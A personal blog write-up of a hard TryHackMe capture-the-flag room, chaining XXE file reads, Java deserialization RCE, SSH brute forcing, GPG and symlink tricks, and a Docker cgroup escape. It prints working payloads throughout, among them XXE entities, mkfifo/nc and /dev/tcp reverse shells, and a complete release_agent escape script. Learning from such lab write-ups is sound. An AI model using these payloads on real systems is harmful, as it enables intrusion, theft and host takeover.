---
layout: post
title: "TryHackMe — You're in a Cave"
date: 2026-05-18
room_url: "https://tryhackme.com/room/inacave"
category: writeup
platform: TryHackMe
difficulty: Hard
tags:
  - XXE
  - Java Deserialization
  - RCE
  - SSH Brute Force
  - GPG
  - Docker Escape
  - Privilege Escalation
  - Symlink Abuse
excerpt: "A hard-rated RPG dungeon themed room chaining XXE injection, Java deserialization RCE, regex-based SSH brute forcing, GPG decryption, symlink abuse, and a cgroup-based Docker container escape."
---

## Overview

"You're in a Cave" is a hard-rated TryHackMe room with an RPG dungeon theme. The narrative follows a cave explorer encountering characters like a skeleton, an old man, and a door — each stage of the story corresponds to a real technical challenge. The room runs inside a Docker container, and the final objective is to escape that container and reach the host machine. There are two flags — one inside the container as root, and one on the host.
This was definitely the most challenging room so far. A week long grind requiring a lot of learning and evaluating in order to reach objectives!

**Attack chain:**
```
Recon → ffuf → Base64 encoded Java objects discovered
→ XXE injection via action.php → Read RPG.java source
→ Java deserialization RCE → Shell as cave
→ Regex wordlist generation → SSH brute force → Shell as door
→ GPG decryption → Environment variable abuse → Shell as skeleton
→ Symlink abuse → Modify root's init script → Root shell (container)
→ Docker detection → cgroup release_agent exploit → Root shell (host)
```

---

## 1. Recon

Started with a full port scan:

```bash
nmap -sV -sC -p- <TARGET_IP>
```

```
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Document
|_http-server-header: Apache/2.4.41 (Ubuntu)
2222/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 79:16:b1:ce:e1:16:79:b4:f1:c7:1f:09:05:b7:75:58 (RSA)
|   256 35:60:6e:3b:a8:ac:4a:6a:76:42:3d:59:13:04:90:19 (ECDSA)
|_  256 79:a6:05:ca:84:32:dc:59:b4:9b:8b:30:95:34:00:c8 (ED25519)
3333/tcp open  dec-notes?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, NULL, RPCCheck, SMBProgNeg, X11Probe, kumo-server: 
|     You find yourself in a cave, what do you do?
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     You find yourself in a cave, what do you do?
|_    Nothing happens
```

Notable ports:
- **80** → Apache HTTP
- **2222** → SSH on non-standard port
- **3333** → Unknown custom service

Viewing the web service on the <TARGET_IP>. A question with a textbox appears. `What do you do?`. Whatever you enter, a 400 status code error appears:

![400 status code error](/assets/images/writeups/in-a-cave/400-error.png)

  *A 400 status code indicates — Server cannot understand the request due to invalid syntax.*

The input I provide clearly isn't in the format the application expects. Traversing through the custom service on Port 3333. The same question appears, but with additional statements:

![Source code of service on Port 3333](/assets/images/writeups/in-a-cave/port-3333.png)

  *Nothing is revealed on the web page, nor in it's source code except additional statements.*  

I proceeded to enumerate through the directories using ffuf:

```bash
ffuf -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt \
> -u http://10.49.135.54/FUZZ \ 
> -mc 200,301,302,403 \
> -t 64
```

Found several endpoints:
```
/search, /attack, /lamp, /matches, /walk, 
```

ffuf enumerates — 5 notable directories. Traversing through all 5 endpoints, reveals Base64 encoded data.   

Decoding each encoded piece of data was a tedious process: 

```bash
base64 --decode <ENCODED_FILE> > <DECODED_FILE>
```

Each decoded message reveals clues. Utilising the `strings` command and piping the output to the `awk` command, will remove any redundent text making the data easier to read:

```bash
strings <DECODED_FILE> | awk 'length($0) > 10'

```

Output:
```
/search → Ljava/lang/String;L
.You can't see anything, the cave is very dark.t

/attack → Ljava/lang/String;L
$You punch the wall, nothing happens.t

/lamp →  Ljava/lang/String;L
 aYou grab a lamp, and it gives enough light to search around
`ls;export INVENTORY=lamp:$INVENTORY`t

/matches → Ljava/lang/String;L
TYou find a box of matches, it gives enough fire for you to see that you're in `pwd`.t

/walk → Ljava/lang/String;L
There's nowhere to go.t

```

  *p.s. These steps might feel a little tedious and redundant — I utilise all the techniques learnt from previous rooms to ensure I don't miss any information        that could be useful.*


I couldn't really inferr what I was reading. Seeing how each line started with `Ljava`, I could insinuate this is java source code. Researching helped me reveal they were — serialized Java objects.

The decoded data before utilising the `strings <DECODED_FILE> | awk 'length($0) > 10'`, dispalys this:
```
��srAction��M��;LcommandtLjava/lang/String;Lnameq~Loutputq~xptTYou find a box of matches, it gives enough fire for you to see that you're in `pwd`.tmatchest
```

Breakdown:
```
��sr → Java serialization header
Action → Java class name
command → field name
java/lang/String → field type
You punch the wall, nothing happens. → the actual string value
attack → the command
```

Connecting to port 3333 with netcat:

```bash
nc <TARGET_IP> 3333
```

Returned an RPG-style prompt:
```
You find yourself in a cave, what do you do?
```
  *Random input returned `Nothing happens` and disconnected.*

Using the 5 endpont names as input:
```
walk
There's nowhere to go.

lamp
You grab a lamp, and it gives enough light to search around
Action.class
RPG.class
RPG.java
Serialize.class
commons-io-2.7.jar
run.sh

matches
You find a box of matches, it gives enough fire for you to see that you're in /home/cave/src.

attack
You punch the wall, nothing happens.

search
You can't see anything, the cave is very dark.
```

We can now logically conclude that `attack, lamp, matches, search, and walk` are java serialised objects. Viewing the `lamp & matches` output — `Matches` reveals the working directory. `lamp` provides more light, revealing all the content within the /src directory. We have an `Action.class` — probably used to instantiate each action. `Serialize.class` — each action turned to java serialised objects. `RPG.java` — could be the main script taking each action and converting them. These are clearly input pieces the server will accept. Now its about figuring out how to make our own object to exploit the application. 

---

## 2. XXE Injection — Reading Server Files

Going back to the webpage hosted via the <TARGET_IP>. I intercepted the traffic when parsing my input using Burpsuite proxy. Skimming through the writeup, it hints towards `XXE`. I had no clue what XXE was! 

I referred myself to [Portswigger](https://portswigger.net/web-security/xxe), to familiarise myself on the topic. `XXE` is short for `XML External Entity`. XML is a coding language thats used to store and transfer data in a human readable but machine parseable format. This exploit involves — exploiting XML's parsing system. 

The key to the exploit is utilising an `Entity`. To be brief, this is a referrence to a resource. There are internal and external entities. Internal is data defined within the `Document type Definition`. External is also defined within the `DTD`, but the resource is retrived from outside the DTD. 

Thats what our goal is — To have our entity reference an external resource. Which is preferrably sensitive data that shouldn't be seen by an unauthorised user. 

![Burp suite interception](/assets/images/writeups/in-a-cave/burp-intercept.png)

The `/action.php` endpoint accepted POST requests. The POST request is using the default `Content-Type` generated by HTML forms. Most sites expect requests in that format but accept other formats such as `XML`. Changing the `Content-Type` header in Burp Suite from `application/x-www-form-urlencoded` to `application/xml`, returns XML parsing errors — confirming the server was processing XML input.

![XML error reponse ](/assets/images/writeups/in-a-cave/xml-type.png)

  * The 400 status code again indicates a request syntax error. As its expecting xml tags indicated using `<>` *

We now know the application accepts XML content. We can now access the attack surface by reformatting our request to use the XML format. 
We can now create a payload that tries to retrieve the /etc/passwd file.

Crafted an XXE payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<action>&xxe;</action>
```

![XXE payload returning /etc/passwd](/assets/images/writeups/in-a-cave/xml-passwd.png)

  *External entity successfully resolved — /etc/passwd returned in response*

This confirmed external entities and DTD loading were both enabled. I tried to access the action.php file the same way — though the server returned a 200 status code response, the body had no content. 

Both php and xml use angle bracket syntax. The xml parser will be confused when parsing the php source code, mistaking it for xml instructions. Reading the `action.php` source code via base64 wrapper will assist in avoiding XML parser conflicts with PHP tags:

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/action.php">
```

![Viewing the base64 encoded php source code](/assets/images/writeups/in-a-cave/action.php.png)

Decoded the response:

```bash
echo "<base64response>" | base64 --decode
```

The source confirmed the vulnerability:

```php
libxml_disable_entity_loader(false);  // explicitly enables external entities
$dom->loadXML($data, LIBXML_NOENT | LIBXML_DTDLOAD);  // entities substituted
echo $xml;  // output reflected back
```

Basically most `xxe` vulnerabilities occur cause the `XML parser` supports potentailly dangerous features it doesn't need. `libxml_disable_entity_loader` is disabled, the `LIBXML_NOENT` substitutes entities and `LIBXML_DTDLOAD` loads the DTD — misconfiguraions required for XXE to work. The maker of this room had explicitly enabled them. Terrible web development practises XD!

Lastly, I used XXE to retrieve the `RPG.java` source code with base64 wrapper:
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/cave/src/RPG.java">
```

---

## 3. Java Deserialization RCE — Shell as cave

```
RPG.java:

import java.util.*;
import java.io.*;
import java.io.IOException;
import java.io.InputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import org.apache.commons.io.IOUtils;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;

public class RPG {

    private static final int port = 3333;
    private static Socket connectionSocket;

    private static InputStream is;
    private static OutputStream os;

    private static Scanner scanner;
    private static PrintWriter serverPrintOut;
    public static void main(String[] args) {
        try ( ServerSocket serverSocket = new ServerSocket(port)) {
            while (true) {
                connectionSocket = serverSocket.accept();

                is = connectionSocket.getInputStream();
                os = connectionSocket.getOutputStream();

                scanner = new Scanner(is, "UTF-8");
                serverPrintOut = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);
                try {
                    serverPrintOut.println("You find yourself in a cave, what do you do?");
                    String s = scanner.nextLine();
                    URL url = new URL("http://cave.thm/" + s);
                    URLConnection con = url.openConnection();
                    InputStream in = con.getInputStream();
                    String encoding = con.getContentEncoding();
                    encoding = encoding == null ? "UTF-8" : encoding;
                    String string = IOUtils.toString(in, encoding);
                    string = string.replace("\n", "").replace("\r", "").replace(" ", "");
                    Action action = (Action) Serialize.fromString(string);
                    action.action();
                    serverPrintOut.println(action.output);
                } catch (Exception ex) {
                    serverPrintOut.println("Nothing happens");
                }
                connectionSocket.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

class Action implements Serializable {

    public final String name;
    public final String command;
    public String output = "";

    public Action(String name, String command) {
        this.name = name;
        this.command = command;
    }

    public void action() throws IOException, ClassNotFoundException {
        String s = null;
        String[] cmd = {
            "/bin/sh",
            "-c",
            "echo \"" + this.command + "\""
        };
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String result = "";
        while ((s = stdInput.readLine()) != null) {
            result += s + "\n";
        }
        this.output = result;
    }
}

class Serialize {

    /**
     * Read the object from Base64 string.
     */
    public static Object fromString(String s) throws IOException,
            ClassNotFoundException {
        byte[] data = Base64.getDecoder().decode(s);
        ObjectInputStream ois = new ObjectInputStream(
                new ByteArrayInputStream(data));
        Object o = ois.readObject();
        ois.close();
        return o;
    }

    /**
     * Write the object to a Base64 string.
     */
    public static String toString(Serializable o) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }
}
```

As someone who hasn't touched java since highschool. Utilising the writeup helped me thoroughly understand what the script was doing. Analysing `RPG.java` revealed the full attack chain. The service on port 3333:

1. Takes user input
2. Appends it to `http://cave.thm/` to form a URL
3. Fetches that URL from the web server
4. Base64 decodes the response
5. Deserializes it into a Java `Action` object
6. Calls `action.action()` which executes the shell command stored in the object's `command` field

  **Reminder:** The line of code `URL url = new URL("http://cave.thm/" + s);`. `cave.thm` is a host that should be inserted into the `/etc/hosts` file for 
    IP → hostname mapping.  

This meant by controlling what `action.php` returns — by making it serve a malicious serialized Java object — the command inside that object would execute on the server.

A modified version of the RPG.java script was used to generate a Base64 encoded serialized `Action` object with a reverse shell in the command field.
By replacing the main method in the `RPG.java` script with our reverse shell payload:

```
        try
        {                                                                                                                                  
         String str = Serialize.toString( new Action("abc","trying\";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <TARGET_IP> 9001 >/tmp/f;echo \"") );                                                                                                                        
            System.out.println( "abc : " + str );                                                                                                                                                                        
        }
        catch(Exception e)
        {                                                                                                                  
            System.out.println("aa");                                                                                                         
        }   
```

Executing the script will give us our base64 encoded serialized `Action` object :
```
java RPG.java
```

**Critical issue:** Base64 special characters (`+`, `/`, `=`) were breaking the URL, and `scanner.nextLine()` only reads a single line — so the payload had to be **URL-encoded** before sending. Which was done by pasting object into the burp suite repeater, selecting the encoded action object:

```
right-click → Convert Selection → URL → URL-encode key characters 
```

Started a listener:

```bash
nc -lvnp 9001
```

connect to web service via netcat:
```
nc <TARGET_IP> 3333
You find yourself in a cave, what do you do? 
```

After URL-encoding and passing the payload via netcat, port 3333 fetched it from `action.php`, deserialized it, and executed the command:

Pass in the payload:
```
action.php?<xml>[SERIALIZED_OBJECT, URL_ENCODED]</xml>
```


![Reverse shell as cave](/assets/images/writeups/in-a-cave/cave.png)

  *Malicious serialized Java object executed — reverse shell received as cave*

---

## 4. cave → door (Regex Wordlist + SSH Brute Force)

Refering back to the `macthes` base64 decoded data. We start of in the `/src`. If we traverse back one step:
```bash
cd ..
ls
```

Inside cave's home directory, `info.txt` described a wooden door without a keyhole, with random text carved on it representing the password:

```
^ed[h#f]{3}[123]{1,2}xf[!@#*]$
```

This is what we call a `Regular Expression → regex`. Refer to this [room](https://tryhackme.com/room/catregex) to learn more about it. **Warning:** If your just like me, learning about this concept whilst simultaneously doing this room — You could potentially fry your brain!

Breaking down the regex:

| Part | Meaning |
|---|---|
| `^ed` | Must start with `ed` |
| `[h#f]{3}` | Exactly 3 chars from h, #, or f |
| `[123]{1,2}` | One or two chars from 1, 2, or 3 |
| `xf` | Literal `xf` |
| `[!@#*]$` | Ends with one of !, @, #, * |

Utilising a python script called "[exrex.py](https://github.com/asciimoo/exrex/blob/master/exrex.py)" to generate every valid combination and saved them to a wordlist. 

```
python3 exrex.py -o wordlist '^ed[h#f]{3}[123]{1,2}xf[!@#*]$'
```

Then used Hydra to brute force SSH:

```bash
hydra -l door -P wordlist.txt ssh://<TARGET_IP> -s 2222
```

Output:
```
[2222][ssh] host: <TARGET_IP>   login: door   password: <here>
```
  *Hydra returns the correct password matching the regex pattern*

Using the brute forced password to log into the `door` user via ssh: 
```bash
ssh door@<TARGET_IP> -p 2222
```
  **Reminder:** The ssh service isn't listening on the default port. Don't make the same mistake I did — Lost in my querolousness trying to figure out why I           couldn't pick up a connection!


![ssh login to door user](/assets/images/writeups/in-a-cave/door.png)

---

## 5. door → skeleton (GPG Decryption + Environment Variable Abuse)

In door's home directory:
- `info.txt` → a hint for the next objective 
- `oldman.gpg` → a GPG encrypted message
- `skeleton` → an executable file

info.txt:
```
After using your brute force against the door you broke it!
You can see that the cave has only one way, in your right you see an old man speaking in charades and in front of you there's a fully armed skeleton.
It looks like the skeleton doesn't want to let anyone pass through.
```

oldman.gpg is an encrypted message. Therefore viewing the content without the key is useless. So we need to figure out how to get the key. 

skeleton:
```bash
you cannot defeat the skeleton with your current items, your inventory is empty.
```
  *We only have `execute` permissions on this file *

**We need find a way to decrypt the oldman's message.**

![Utilising xxe to view applications /etc/hosts](/assets/images/writeups/in-a-cave/hosts-file.png)

  *Utilising xxe to view the applications /etc/hosts — A virtual host is running on the TARGET_IP*

**Another Option:** Use ffuf to fuzz the `cave.thm` domain for virtual hosts.

```bash
ffuf -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u http://cave.thm -H "Host:FUZZ.cave.thm" -fs 337 -t 80
```
Output:
```
adventurer              [Status: 200, Size: 772, Words: 55, Lines: 16, Duration: 142ms]
```

After adding the virtual host to the `/etc/hosts` file. I traversed to the webpage.  
  
![Viewing the webpage of the virtual host](/assets/images/writeups/in-a-cave/adventurer.png)
  
  *A .priv file is stored on the page!*

Accessing the adventurer.priv file, reveals a `PGP private key block`. I stored the key on my system and transferred it to the target machine.

Imported the private key:
```bash
gpg --import adventurer.priv
```

The key was requesting a passphrase and I came across it from a whimsical procedure. When I was viewing the `info.txt` file I tried to open it with mouspad, but the target system didn't have it installed. When I opened it with nano, extra information was given. My clueless self thought it was a glitch XD!

```
After using your brute force against the door you broke it!
You can see that the cave has only one way, in your right you see an old man speaking in charades and in front of you there's a fully armed skeleton.
The private key password is <PASSWORD> ^[[A
It looks like the skeleton doesn't want to let anyone pass through.

```

Using nano to view info.txt revealed a hidden line invisible to cat. The `^[[A` ANSI escape code — the up arrow — moves the terminal cursor up one line, causing the following output to overwrite and hide the password line. cat interprets the escape code and acts on it, nano displays it as raw text

Using:
```
cat -v 
```
  *This outputs non-printing characters too.*

I guess useful information can just miraculously fall on your lap when it comes to pentesting... 

Now entering the passphrase for the pgp key enables us to decrypt the `oldman.txt` file:
```
gpg --decrypt oldman.txt
```

The decrypted message revealed a hint:
```
IT'S DANGEROUS TO GO ALONE! TAKE THIS bone-breaking-war-hammer
```

If we refer back to the execution file `skeleton`. Running it returned:
```
Inventory is empty, you cannot defeat the skeleton
```

Refering to the decoded lamp data:
```
export INVENTORY=lamp:$INVENTORY`t
```
This is the process of appending data to an environment variable. Think of them as universal settings that programs can read. Establishing how the system looks acts and feels.  

locate the INVENTORY env through filtering:
```bash
set | grep INVENTORY
INVENTORY=

```

Through filtering I'm able to clearly see an INVENTORY environemt variable exist. Now I just have to add the `bone-breaking-war-hammer` to it:
```bash
export INVENTORY=bone-breaking-war-hammer
./skeleton
```

The binary executed successfully and outputs the password for the `skeleton` user.

```bash
ssh skeleton@<TARGET_IP> -p 2222
```

![Logged into skeleton user via ssh](/assets/images/writeups/in-a-cave/skeleton.png)

---

## 6. skeleton → root (Symlink Abuse + Init Script Modification)

Enumeration as skeleton revealed two key findings:

```bash
sudo -l
# (root) NOPASSWD: /bin/kill

find / -writable -type d 2>/dev/null
# /opt/link/
```

`/opt/link/` was world-writable and contained a symlink called `startcon` pointing to `/root/start.sh`.

Reading `start.sh` revealed it was **PID 1** — the container's init script — running sequentially:
1. Starting SSH
2. Starting Apache
3. Running the Java service as cave via `su`
4. Dropping into `/bin/bash`

The script was permanently stuck at the `su - cave` line waiting for the Java process.

Because `startcon` is a symlink to the real `/root/start.sh`, appending to `startcon` appends to the actual file:

```bash
echo '/bin/bash -i >& /dev/tcp/<KALI_IP>/9001 0>&1' >> /opt/link/startcon
```

Started a listener:

```bash
nc -lvnp 9001
```

Then killed the root bash process (the final `/bin/bash` in `start.sh` already running as PID 114) using the sudo permission:

```bash
sudo /bin/kill -9 114
```

This caused `start.sh` to rerun that final section, hit the appended reverse shell line, and connect back — giving a root shell inside the container.

```bash
root@<TARGET>:~#
```

![Root shell inside container](/assets/images/writeups/cave/container-root.png)

  *Killing the bash PID triggered start.sh to rerun — hitting our appended reverse shell*

---

## 7. Detecting the Docker Container

Three indicators confirmed the environment was a Docker container:

```bash
ls /.dockerenv          # exists at filesystem root

cat /proc/1/cgroup      # every entry contains /docker/<container_id>

ps aux                  # unusually few processes, PID 1 is a bash script
                        # not systemd or init
```

---

## 8. Docker Container Escape (cgroup release_agent)

The room indicated a flag existed on the **host machine**. Used the cgroup `release_agent` exploit — abusing the Linux kernel's cgroup notification mechanism.

The steps:

```bash
# Mount a cgroup filesystem inside the container
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# Enable notify_on_release
echo 1 > /tmp/cgrp/x/notify_on_release

# Find container's path on the host filesystem
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# Create the payload script on the host filesystem
echo "#!/bin/bash" > $host_path/exploit.sh
echo "bash -i >& /dev/tcp/<KALI_IP>/9002 0>&1" >> $host_path/exploit.sh
chmod +x $host_path/exploit.sh

# Set release_agent to our script
echo "$host_path/exploit.sh" > /tmp/cgrp/release_agent

# Trigger it
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Because the `release_agent` fires as **root on the host kernel** — not inside the container — the reverse shell connected back from the actual host machine.

```bash
# Attacker terminal
nc -lvnp 9002

root@host:~# cat /root/info.txt
THM{digging_down_then_digging_up}
```

![Host root shell via cgroup escape](/assets/images/writeups/cave/host-root.png)

  *release_agent fires on the host kernel — shell received as host root*

---

## Key Takeaways

| Technique | Lesson |
|---|---|
| Base64 encoded Java objects | Decode and run `strings` on unknown binary data to reveal structure |
| XXE injection | `LIBXML_NOENT` + `LIBXML_DTDLOAD` + external entities = XXE. Always check Content-Type |
| PHP wrapper for XXE | `php://filter/convert.base64-encode/resource=` bypasses XML conflicts with PHP files |
| Java deserialization RCE | If a service deserializes user-controlled data, you control what executes |
| URL encoding Base64 | Base64 special characters break URLs — always URL-encode before sending |
| Regex password generation | A regex pattern defines every valid password — `itertools.product` generates them all |
| GPG decryption | Private key + encrypted file = decrypted secret. Always check for `.gpg` and `.priv` files |
| Environment variable abuse | Binaries that check `$ENV_VAR` can be manipulated by exporting the expected value |
| Symlink abuse | Writing to a symlink writes to its target — world-writable directories containing symlinks to privileged files are dangerous |
| Docker detection | `/.dockerenv`, `/proc/1/cgroup`, and unusual PID 1 all indicate a container |
| cgroup release_agent escape | The release_agent fires on the host kernel — container boundaries don't apply |

---

## Tools Used

- nmap
- ffuf
- Burp Suite
- netcat
- Python (itertools.product — wordlist generation)
- Hydra
- GPG
- strings / awk
- Custom Java serialization code

---

*Room completed on TryHackMe. Write-up by [Wandipa Marema] — [2026-05-18]*
